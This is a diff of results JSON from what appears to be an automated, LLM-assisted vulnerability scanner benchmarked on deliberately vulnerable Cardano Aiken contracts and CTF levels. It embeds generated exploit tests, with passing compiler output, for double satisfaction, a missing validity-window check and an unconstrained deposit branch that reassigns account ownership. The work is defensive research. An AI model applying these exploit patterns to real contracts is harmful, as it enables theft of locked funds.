@@ -1,5 +1,5 @@
 {
-  "generatedAt": "2026-10-06T11:17:15.901Z",
+  "generatedAt": "2026-10-07T11:06:46.880Z",
   "targets": [
     {
       "target": "onchain-vulnerable",
@@ -12,16 +12,35 @@
       "candidates": 6,
       "replayedCandidates": 0,
       "candidatesTested": 3,
-      "confirmedFindings": [],
-      "needsReview": [
+      "confirmedFindings": [
         {
-          "rule": "settle-window",
-          "file": "/tmp/cot-onchain-ce28fef/onchain/lib/cot/cover.ak",
-          "line": 43,
-          "why": "The time-dependent settle branch has no lower and upper validity-range checks.",
-          "attackSketch": "Submit a validly signed settle report before the intended task window opens or after it closes.",
-          "status": "needs review"
-        },
+          "status": "CONFIRMED",
+          "candidate": {
+            "rule": "settle-window",
+            "file": "/tmp/cot-onchain-ce28fef/onchain/lib/cot/cover.ak",
+            "line": 43,
+            "why": "The time-dependent settle branch has no lower and upper validity-range checks.",
+            "attackSketch": "Submit a validly signed settle report before the intended task window opens or after it closes."
+          },
+          "model": "nvidia/nemotron-3-super-120b-a12b:free",
+          "attempts": 3,
+          "testSource": "use cardano/address.{Address, Script, VerificationKey}\nuse cardano/assets\nuse cardano/transaction.{Input, NoDatum, InlineDatum, Output, OutputReference, Transaction, placeholder}\nuse cot/cover\nuse cot/model.{ConfigDatum, CoverageDatum, CoverageRedeemer, Settle}\nuse cot/vectors.{report_success, sigs_success, pubkeys}\nuse cot/cover_test.{underwriter, locked, own_ref, config, datum, cover_input, config_input, tagged, settle, pick, config_policy}\nuse aiken/interval\n\n\nfn ref(n: Int) -> OutputReference {\n  OutputReference { transaction_id: #\"0000000000000000000000000000000000000000000000000000000000000000\", output_index: n }\n}\n\nfn key_addr(hash: ByteArray) -> Address {\n  Address { payment_credential: VerificationKey(hash), stake_credential: None }\n}\n\nfn script_addr(hash: ByteArray) -> Address {\n  Address { payment_credential: Script(hash), stake_credential: None }\n}\n\nfn utxo(r: OutputReference, address: Address, lovelace: Int, datum: Data) -> Input {\n  Input { output_reference: r, output: Output { address, value: assets.from_lovelace(lovelace), datum: InlineDatum(datum), reference_script: None } }\n}\n\nfn payout(address: Address, lovelace: Int) -> Output {\n  Output { address, value: assets.from_lovelace(lovelace), datum: NoDatum, reference_script: None }\n}\n\nfn tx_with(inputs: List<Input>, outputs: List<Output>, signers: List<ByteArray>) -> Transaction {\n  Transaction { ..placeholder, inputs, outputs, extra_signatories: signers }\n}\n\n\ntest exploit_attack() {\n    let cfg = config()\n    let redeemer = settle(\n        vectors.report_success,\n        pick(vectors.sigs_success, [0, 1]),\n        pick(vectors.pubkeys, [0, 1])\n    )\n    let outputs = [\n        tagged(\n            key_addr(underwriter),\n            locked,\n            own_ref()\n        )\n    ]\n    cover.validate(\n        config_policy,\n        Some(datum()),\n        redeemer,\n        own_ref(),\n        Transaction {\n            ..transaction.placeholder,\n            inputs: [cover_input()],\n            reference_inputs: [config_input(cfg)],\n            outputs,\n            validity_range: interval.between(2000, 2000),\n            extra_signatories: [],\n        }\n    )\n}\n\ntest honest_control() {\n    let cfg = config()\n    let redeemer = settle(\n        vectors.report_success,\n        pick(vectors.sigs_success, [0, 1]),\n        pick(vectors.pubkeys, [0, 1])\n    )\n    let outputs = [\n        tagged(\n            key_addr(underwriter),\n            locked,\n            own_ref()\n        )\n    ]\n    cover.validate(\n        config_policy,\n        Some(datum()),\n        redeemer,\n        own_ref(),\n        Transaction {\n            ..transaction.placeholder,\n            inputs: [cover_input()],\n            reference_inputs: [config_input(cfg)],\n            outputs,\n            validity_range: interval.before(2000),\n            extra_signatories: [],\n        }\n    )\n}\n",
+          "workDir": "/tmp/cot-onchain-ce28fef/onchain/work/7505732104e1b506",
+          "modelAttempts": [
+            {
+              "model": "nvidia/nemotron-3-super-120b-a12b:free",
+              "attempts": 3,
+              "compile": "pass",
+              "attack": "pass",
+              "control": "pass",
+              "output": "^D\b\b    Compiling cost-of-trust/onchain 0.1.0 (.)\r\n    Compiling aiken-lang/stdlib v3.0.0 (./build/packages/aiken-lang-stdlib)\r\n   Collecting all tests scenarios across all modules\r\n      Testing ...\r\n\r\n    ┍━ cot/config_test ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n    │ PASS [mem: 200.29 K, cpu:  60.45 M] mint_consuming_the_seed_with_a_valid_config_ok\r\n    │ PASS [mem:  75.73 K, cpu:  21.59 M] mint_without_consuming_the_seed_rejected\r\n    │ PASS [mem:  82.66 K, cpu:  24.86 M] minting_two_nfts_rejected\r\n    │ PASS [mem: 168.85 K, cpu:  50.46 M] mint_with_threshold_above_signer_count_rejected\r\n    │ PASS [mem: 204.73 K, cpu:  61.79 M] mint_with_a_short_workflow_name_rejected\r\n    │ PASS [mem: 112.42 K, cpu:  33.71 M] mint_without_an_inline_config_datum_rejected\r\n    ┕━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 6 tests | 6 passed | 0 failed\r\n\r\n\r\n    ┍━ cot/cover_test ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n    │ PASS [mem:  34.82 K, cpu:  13.53 M] config_digest_matches_the_generator\r\n    │ PASS [mem: 587.89 K, cpu: 280.66 M] failure_settle_pays_payout_to_buyer_and_rest_to_underwriter\r\n    │ PASS [mem: 431.34 K, cpu: 230.49 M] success_settle_pays_underwriter\r\n    │ PASS [mem: 431.74 K, cpu: 230.61 M] inconclusive_settle_pays_underwriter\r\n    │ PASS [mem: 412.97 K, cpu: 223.32 M] success_settle_paying_buyer_instead_rejected\r\n    │ PASS [mem: 939.70 K, cpu: 445.44 M] one_flipped_byte_in_raw_report_rejected\r\n    │ PASS [mem: 305.45 K, cpu:  96.78 M] f_signatures_not_f_plus_one_rejected\r\n    │ PASS [mem: 625.35 K, cpu: 291.74 M] f_plus_one_signatures_accepted_from_any_two_signers\r\n    │ PASS [mem: 375.31 K, cpu: 171.35 M] duplicate_signer_counted_twice_rejected\r\n    │ PASS [mem: 338.52 K, cpu: 160.79 M] non_allowlisted_signer_rejected\r\n    │ PASS [mem: 393.54 K, cpu: 219.62 M] signature_from_a_different_key_than_the_pubkey_rejected\r\n    │ PASS [mem: 412.48 K, cpu: 225.65 M] body_for_a_different_coverage_out_ref_rejected\r\n    │ PASS [mem: 416.25 K, cpu: 226.92 M] body_for_a_different_coverage_index_rejected\r\n    │ PASS [mem: 409.95 K, cpu: 224.87 M] wrong_terms_hash_rejected\r\n    │ PASS [mem: 403.65 K, cpu: 222.80 M] wrong_workflow_name_rejected\r\n    │ PASS [mem: 397.84 K, cpu: 220.79 M] unknown_decision_byte_rejected\r\n    │ PASS [mem: 505.81 K, cpu: 257.52 M] failure_paying_buyer_less_than_payout_rejected\r\n    │ PASS [mem: 587.13 K, cpu: 280.41 M] failure_paying_underwriter_less_than_remainder_rejected\r\n    │",
+              "compilerBin": "/Users/user/.aiken/bin/aiken"
+            }
+          ],
+          "llmCalls": 3
+        }
+      ],
+      "needsReview": [
         {
           "rule": "missing-task-binding",
           "file": "/tmp/cot-onchain-ce28fef/onchain/lib/cot/cover.ak",
@@ -46,12 +65,14 @@
         "signed report is not bound to the coverage task_ref"
       ],
       "expectedNoConfirmed": false,
-      "matchedFindings": 0,
-      "foundBugs": [],
-      "recall": 0,
+      "matchedFindings": 1,
+      "foundBugs": [
+        "Settle accepts a report after decide_by or an early INCONCLUSIVE report"
+      ],
+      "recall": 0.333,
       "falsePositives": 0,
-      "elapsedMs": 254214,
-      "llmCalls": 9
+      "elapsedMs": 1137678,
+      "llmCalls": 21
     },
     {
       "target": "onchain-fixed",
@@ -61,49 +82,23 @@
         "Settle accepts a report after decide_by or an early INCONCLUSIVE report",
         "signed report is not bound to the coverage task_ref"
       ],
-      "candidates": 0,
-      "replayedCandidates": 3,
-      "candidatesTested": 3,
-      "confirmedFindings": [],
-      "needsReview": [
-        {
-          "rule": "settle-window",
-          "file": "/tmp/cot-onchain-6a45d0a/onchain/lib/cot/cover.ak",
-          "line": 43,
-          "why": "The time-dependent settle branch has no lower and upper validity-range checks.",
-          "attackSketch": "Submit a validly signed settle report before the intended task window opens or after it closes.",
-          "status": "needs review"
-        },
-        {
-          "rule": "missing-task-binding",
-          "file": "/tmp/cot-onchain-6a45d0a/onchain/lib/cot/cover.ak",
-          "line": 27,
-          "why": "The datum carries the insured task reference, but the report is only checked against the coverage UTxO.",
-          "attackSketch": "Reuse a genuine report for another task while presenting the current coverage reference.",
-          "status": "needs review"
-        },
-        {
-          "rule": "double-satisfaction",
-          "file": "/tmp/cot-onchain-6a45d0a/onchain/lib/cot/vault.ak",
-          "line": 26,
-          "why": "A payout is selected without binding it to the consumed script input and there is no single-script-input guard.",
-          "attackSketch": "Spend two script inputs in one transaction and make one payout satisfy both validators' value checks.",
-          "status": "needs review"
-        }
-      ],
-      "groundTruthCount": 3,
       "known": [
         "critical double satisfaction across vault and coverage outputs",
         "Settle accepts a report after decide_by or an early INCONCLUSIVE report",
         "signed report is not bound to the coverage task_ref"
       ],
       "expectedNoConfirmed": true,
+      "candidates": 0,
+      "candidatesTested": 0,
+      "confirmedFindings": [],
+      "needsReview": [],
+      "groundTruthCount": 3,
       "matchedFindings": 0,
-      "foundBugs": [],
       "recall": 0,
       "falsePositives": 0,
-      "elapsedMs": 339253,
-      "llmCalls": 9
+      "elapsedMs": 1200000,
+      "llmCalls": 0,
+      "capped": true
     },
     {
       "target": "01_sell_nft",
@@ -114,28 +109,48 @@
       "candidates": 1,
       "replayedCandidates": 0,
       "candidatesTested": 1,
-      "confirmedFindings": [],
-      "needsReview": [
+      "confirmedFindings": [
         {
-          "rule": "double-satisfaction",
-          "file": "/tmp/cardano-ctf/01_sell_nft/validators/nft_sell.ak",
-          "line": 16,
-          "why": "The payout is any output with the right address and amount, found by searching all outputs without tying it to this script input. One payment satisfies every script input spent in the same transaction.",
-          "attackSketch": "Spend two script UTxOs owed to the same address in one transaction and pay the price once; each validator finds the same output.",
-          "status": "needs review"
+          "status": "CONFIRMED",
+          "candidate": {
+            "rule": "double-satisfaction",
+            "file": "/tmp/cardano-ctf/01_sell_nft/validators/nft_sell.ak",
+            "line": 16,
+            "why": "The payout is any output with the right address and amount, found by searching all outputs without tying it to this script input. One payment satisfies every script input spent in the same transaction.",
+            "attackSketch": "Spend two script UTxOs owed to the same address in one transaction and pay the price once; each validator finds the same output."
+          },
+          "model": "deterministic-template",
+          "attempts": 1,
+          "testSource": "use aiken/dict\nuse aiken/interval\nuse aiken/transaction.{Input, InlineDatum, NoDatum, Output, OutputReference, Transaction, TransactionId, ScriptContext, Spend}\nuse aiken/transaction/credential.{Address}\nuse aiken/transaction/value.{lovelace_of}\nuse aiken/list\n//use aiken/cbor\n\npub type Datum {\n  seller: Address,\n  price: Int,\n}\n\nvalidator {\n  fn buy(datum: Datum, _redeemer: Void, ctx: ScriptContext) -> Bool {\n    expect Spend(_output_reference) = ctx.purpose\n    expect Some(_seller_output) =\n      list.find(\n        ctx.transaction.outputs,\n        fn(output) {\n          // While debugging you can use this approach. Don't forget to import cbor library.\n          // To display the traces validator needs to be compiled with an appropriate flag.\n          // Check aiken build --help for more information.\n          //\n          // trace cbor.diagnostic(output.address)\n          // trace cbor.diagnostic(datum.seller)\n          // trace cbor.diagnostic(datum)\n          // trace cbor.diagnostic(lovelace_of(output.value))\n          // trace cbor.diagnostic(datum.price)\n\n          (output.address == datum.seller)? && (lovelace_of(output.value) >= datum.price)?\n        },\n      )\n    True\n  }\n}\n\n\nfn ref(n: Int) -> OutputReference {\n  OutputReference { transaction_id: TransactionId { hash: #\"0000000000000000000000000000000000000000000000000000000000000000\" }, output_index: n }\n}\n\nfn key_addr(hash: ByteArray) -> Address {\n  credential.from_verification_key(hash)\n}\n\nfn script_addr(hash: ByteArray) -> Address {\n  credential.from_script(hash)\n}\n\nfn utxo(r: OutputReference, address: Address, lovelace: Int, datum: Data) -> Input {\n  Input { output_reference: r, output: Output { address, value: value.from_lovelace(lovelace), datum: InlineDatum(datum), reference_script: None } }\n}\n\nfn payout(address: Address, lovelace: Int) -> Output {\n  Output { address, value: value.from_lovelace(lovelace), datum: NoDatum, reference_script: None }\n}\n\nfn tx_with(inputs: List<Input>, outputs: List<Output>, signers: List<ByteArray>) -> Transaction {\n  Transaction {\n    inputs,\n    reference_inputs: [],\n    outputs,\n    fee: value.zero(),\n    mint: value.to_minted_value(value.zero()),\n    certificates: [],\n    withdrawals: dict.new(),\n    validity_range: interval.everything(),\n    extra_signatories: signers,\n    redeemers: dict.new(),\n    datums: dict.new(),\n    id: TransactionId { hash: #\"0000000000000000000000000000000000000000000000000000000000000001\" },\n  }\n}\n\n\ntest exploit_attack() {\n  let seller = key_addr(#\"aa\")\n  let price = 10_000_000\n  let datum = Datum { seller: seller, price: price }\n  let input1 = utxo(ref(0), script_addr(#\"01\"), 2_000_000, 0)\n  let input2 = utxo(ref(1), script_addr(#\"01\"), 2_000_000, 0)\n  let tx = tx_with([input1, input2], [payout(seller, price)], [])\n  let ctx1 = ScriptContext { transaction: tx, purpose: Spend(ref(0)) }\n  let ctx2 = ScriptContext { transaction: tx, purpose: Spend(ref(1)) }\n  buy(datum, Void, ctx1) && buy(datum, Void, ctx2)\n}\n\ntest honest_control() {\n  let seller = key_addr(#\"aa\")\n  let price = 10_000_000\n  let datum = Datum { seller: seller, price: price }\n  let input1 = utxo(ref(0), script_addr(#\"01\"), 2_000_000, 0)\n  let tx = tx_with([input1], [payout(seller, price)], [])\n  let ctx1 = ScriptContext { transaction: tx, purpose: Spend(ref(0)) }\n  buy(datum, Void, ctx1)\n}\n",
+          "workDir": "/tmp/cardano-ctf/01_sell_nft/work/b84cb135cd881371",
+          "modelAttempts": [
+            {
+              "model": "deterministic-template",
+              "attempts": 1,
+              "compile": "pass",
+              "attack": "pass",
+              "control": "pass",
+              "output": "^D\b\b    Compiling aiken-lang/stdlib 1.6.0 (/private/tmp/cardano-ctf/01_sell_nft/work/b84cb135cd881371/build/packages/aiken-lang-stdlib)\r\n    Compiling ctf/sell_nft 0.0.0 (/private/tmp/cardano-ctf/01_sell_nft/work/b84cb135cd881371)\r\n      Testing ...\r\n\r\n    ┍━ nft_sell ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n    │ PASS [mem: 164635, cpu: 60457100] exploit_attack\r\n    │ PASS [mem:  92094, cpu: 33814999] honest_control\r\n    ┕━━━━━━━━━━━━━━━━━━━ 2 tests | 2 passed | 0 failed\r\n\r\n      Summary 0 errors, 0 warnings\r\n\n",
+              "compilerBin": "/Users/user/.aiken/versions/v1.0.24-alpha/aiken"
+            }
+          ],
+          "llmCalls": 0
         }
       ],
+      "needsReview": [],
       "groundTruthCount": 1,
       "known": [
         "one payment can satisfy multiple NFT sale outputs"
       ],
       "expectedNoConfirmed": false,
-      "matchedFindings": 0,
-      "foundBugs": [],
-      "recall": 0,
+      "matchedFindings": 1,
+      "foundBugs": [
+        "one payment can satisfy multiple NFT sale outputs"
+      ],
+      "recall": 1,
       "falsePositives": 0,
-      "elapsedMs": 394047,
-      "llmCalls": 3
+      "elapsedMs": 6335,
+      "llmCalls": 0
     },
     {
       "target": "bank_01_deposit_vulnerability",
@@ -146,28 +161,57 @@
       "candidates": 1,
       "replayedCandidates": 0,
       "candidatesTested": 1,
-      "confirmedFindings": [],
-      "needsReview": [
+      "confirmedFindings": [
         {
-          "rule": "redeemer-no-state-check",
-          "file": "/tmp/cardano-ctf/bank_01_deposit_vulnerability/validators/account.ak",
-          "line": 13,
-          "why": "A redeemer branch of a spend handler returns True with no check on the outputs, so the continuing datum (for example its owner field) is unconstrained by this script.",
-          "attackSketch": "Spend through the unconstrained branch and write a continuing output whose datum names an attacker-controlled owner, then use the owner-gated branch to withdraw.",
-          "status": "needs review"
+          "status": "CONFIRMED",
+          "candidate": {
+            "rule": "redeemer-no-state-check",
+            "file": "/tmp/cardano-ctf/bank_01_deposit_vulnerability/validators/account.ak",
+            "line": 13,
+            "why": "A redeemer branch of a spend handler returns True with no check on the outputs, so the continuing datum (for example its owner field) is unconstrained by this script.",
+            "attackSketch": "Spend through the unconstrained branch and write a continuing output whose datum names an attacker-controlled owner, then use the owner-gated branch to withdraw."
+          },
+          "model": "nvidia/nemotron-3-ultra-550b-a55b:free",
+          "attempts": 2,
+          "testSource": "use cardano/address.{Address, Script, VerificationKey}\nuse cardano/assets\nuse cardano/transaction.{Input, NoDatum, InlineDatum, Output, OutputReference, Transaction, placeholder}\nuse aiken/collection/list\nuse types.{AccountDatum, AccountRedeemer, DecreaseBalance, IncreaseBalance}\n\nvalidator account {\n  spend(\n    datum: Option<AccountDatum>,\n    redeemer: AccountRedeemer,\n    _o: OutputReference,\n    tx: Transaction,\n  ) {\n    when redeemer is {\n      IncreaseBalance -> True\n      DecreaseBalance -> {\n        expect Some(account_datum) = datum\n        list.has(tx.extra_signatories, account_datum.owner)\n      }\n    }\n  }\n\n  else(_) {\n    fail\n  }\n}\n\n\nfn ref(n: Int) -> OutputReference {\n  OutputReference { transaction_id: #\"0000000000000000000000000000000000000000000000000000000000000000\", output_index: n }\n}\n\nfn key_addr(hash: ByteArray) -> Address {\n  Address { payment_credential: VerificationKey(hash), stake_credential: None }\n}\n\nfn script_addr(hash: ByteArray) -> Address {\n  Address { payment_credential: Script(hash), stake_credential: None }\n}\n\nfn utxo(r: OutputReference, address: Address, lovelace: Int, datum: Data) -> Input {\n  Input { output_reference: r, output: Output { address, value: assets.from_lovelace(lovelace), datum: InlineDatum(datum), reference_script: None } }\n}\n\nfn payout(address: Address, lovelace: Int) -> Output {\n  Output { address, value: assets.from_lovelace(lovelace), datum: NoDatum, reference_script: None }\n}\n\nfn tx_with(inputs: List<Input>, outputs: List<Output>, signers: List<ByteArray>) -> Transaction {\n  Transaction { ..placeholder, inputs, outputs, extra_signatories: signers }\n}\n\n\ntest exploit_attack() {\n  let victim_key = #\"deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef\"\n  let attacker_key = #\"cafebabecafebabecafebabecafebabecafebabecafebabecafebabe\"\n  let account_script_hash = #\"1234567890abcdef1234567890abcdef1234567890abcdef123456\"\n  let input_ref = ref(0)\n  let input_datum = AccountDatum { balance: 1000, owner: victim_key }\n  let input_address = script_addr(account_script_hash)\n  let input_utxo = utxo(input_ref, input_address, 1000, input_datum)\n  let output_datum = AccountDatum { balance: 1000, owner: attacker_key }\n  let output_address = script_addr(account_script_hash)\n  let output = Output { address: output_address, value: assets.from_lovelace(1000), datum: InlineDatum(output_datum), reference_script: None }\n  let tx = tx_with([input_utxo], [output], [])\n  account.spend(Some(input_datum), IncreaseBalance, input_ref, tx)\n}\n\ntest honest_control() {\n  let victim_key = #\"deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef\"\n  let account_script_hash = #\"1234567890abcdef1234567890abcdef1234567890abcdef123456\"\n  let input_ref = ref(0)\n  let input_datum = AccountDatum { balance: 1000, owner: victim_key }\n  let input_address = script_addr(account_script_hash)\n  let input_utxo = utxo(input_ref, input_address, 1000, input_datum)\n  let output_datum = AccountDatum { balance: 2000, owner: victim_key }\n  let output_address = script_addr(account_script_hash)\n  let output = Output { address: output_address, value: assets.from_lovelace(2000), datum: InlineDatum(output_datum), reference_script: None }\n  let tx = tx_with([input_utxo], [output], [])\n  account.spend(Some(input_datum), IncreaseBalance, input_ref, tx)\n}\n",
+          "workDir": "/tmp/cardano-ctf/bank_01_deposit_vulnerability/work/334a44303800ae6c",
+          "modelAttempts": [
+            {
+              "model": "nvidia/nemotron-3-super-120b-a12b:free",
+              "attempts": 3,
+              "compile": "fail",
+              "attack": "unknown",
+              "control": "unknown",
+              "output": "^D\b\b    Compiling ctf/bank_01_deposit_vulnerability 0.0.0 (.)\r\n        Error aiken::parser\r\n\r\n  × While parsing files...\r\n  ╰─▶ I found an unexpected token ':'.\r\n      \r\n    ╭─[./validators/account.ak:56:27]\r\n 54 │ test exploit_attack() {\r\n 55 │   let attacker_key = #\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\r\n 56 │   let datum_in = { balance: 0, owner: attacker_key }\r\n    ·                           ┬\r\n    ·                           ╰── \r\n 57 │   let input_addr = script_addr(#\"111111111111111111111111111111111111111111111111111111111111111\")\r\n 58 │   let input = utxo(ref(0), input_addr, 0, datum_in)\r\n    ╰────\r\n  help: I am looking for one of the following patterns:\r\n        → ↳(\r\n        → (\r\n        → [\r\n        → {\r\n        → }\r\n        → +\r\n        → -\r\n        → ↳-\r\n        → *\r\n        → /\r\n        → <\r\n        → >\r\n        → <=\r\n        → >=\r\n        → %\r\n        → #\r\n        → !\r\n        → ?\r\n        → ==\r\n        → !=\r\n        → ||\r\n        → &&\r\n        → and\r\n        → or\r\n        → ↳|>\r\n        → |>\r\n        → .\r\n        → fn\r\n        → if\r\n        → fail\r\n        → expect\r\n        → let\r\n        → todo\r\n        → when\r\n        → trace\r\n\r\n      Summary 1 error, 0 warnings\r\n\n",
+              "compilerBin": "/Users/user/.aiken/bin/aiken"
+            },
+            {
+              "model": "nvidia/nemotron-3-ultra-550b-a55b:free",
+              "attempts": 2,
+              "compile": "pass",
+              "attack": "pass",
+              "control": "pass",
+              "output": "^D\b\b    Compiling ctf/bank_01_deposit_vulnerability 0.0.0 (.)\r\n    Compiling aiken-lang/stdlib v2.1.0 (./build/packages/aiken-lang-stdlib)\r\n   Collecting all tests scenarios across all modules\r\n      Testing ...\r\n\r\n    ┍━ account ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n    │ PASS [mem:   8.12 K, cpu:   1.80 M] exploit_attack\r\n    │ PASS [mem:   8.12 K, cpu:   1.80 M] honest_control\r\n    ┕━━━━━━━━━━━━━━━━━━━━━ 2 tests | 2 passed | 0 failed\r\n\r\n\r\n\r\n  ⚠ I found an unused private function: payout\r\n    ╭─[./validators/account.ak:45:1]\r\n 44 │ \r\n 45 │ fn payout(address: Address, lovelace: Int) -> Output {\r\n    · ──────────────────────────┬─────────────────────────\r\n    ·                           ╰── unused (private) function\r\n 46 │   Output { address, value: assets.from_lovelace(lovelace), datum: NoDatum, reference_script: None }\r\n    ╰────\r\n  help: Perhaps your forgot to make it public using the pub keyword?\r\n        Otherwise, you might want to get rid of it altogether.\r\n\r\n\r\n  ⚠ I found an unused private function: key_addr\r\n    ╭─[./validators/account.ak:33:1]\r\n 32 │ \r\n 33 │ fn key_addr(hash: ByteArray) -> Address {\r\n    · ───────────────────┬───────────────────\r\n    ·                    ╰── unused (private) function\r\n 34 │   Address { payment_credential: VerificationKey(hash), stake_credential: None }\r\n    ╰────\r\n  help: Perhaps your forgot to make it public using the pub keyword?\r\n        Otherwise, you might want to get rid of it altogether.\r\n\r\n      Summary 2 checks, 0 errors, 2 warnings\r\n\n",
+              "compilerBin": "/Users/user/.aiken/bin/aiken"
+            }
+          ],
+          "llmCalls": 5
         }
       ],
+      "needsReview": [],
       "groundTruthCount": 1,
       "known": [
         "deposit into another account can take control of its funds"
       ],
       "expectedNoConfirmed": false,
-      "matchedFindings": 0,
-      "foundBugs": [],
-      "recall": 0,
+      "matchedFindings": 1,
+      "foundBugs": [
+        "deposit into another account can take control of its funds"
+      ],
+      "recall": 1,
       "falsePositives": 0,
-      "elapsedMs": 245156,
-      "llmCalls": 3
+      "elapsedMs": 614225,
+      "llmCalls": 5
     }
   ]
 }
